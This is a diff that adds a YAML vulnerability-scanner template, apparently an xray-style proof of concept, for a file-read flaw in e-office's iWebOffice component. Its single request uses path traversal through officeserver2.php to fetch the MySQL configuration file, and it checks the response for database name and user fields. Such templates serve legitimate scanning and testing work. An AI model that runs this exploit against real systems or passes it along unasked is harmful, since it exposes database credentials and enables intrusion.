@@ -1,0 +1,17 @@
+name: e-office-iweboffice-fileread
+set:
+  s0: randomInt(10000,99999)
+groups:
+  poc:  
+   -  method: GET
+      path: /iweboffice/officeserver2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../bin/mysql_config.ini
+      follow_redirects: false
+      headers:
+      body: 
+      expression: >-
+        response.body.bcontains(b'dataname') && response.body.bcontains(b"datauser")
+      search: '(?P<token>\d{5,11})'
+detail: 
+  links: 
+  authors:
+  
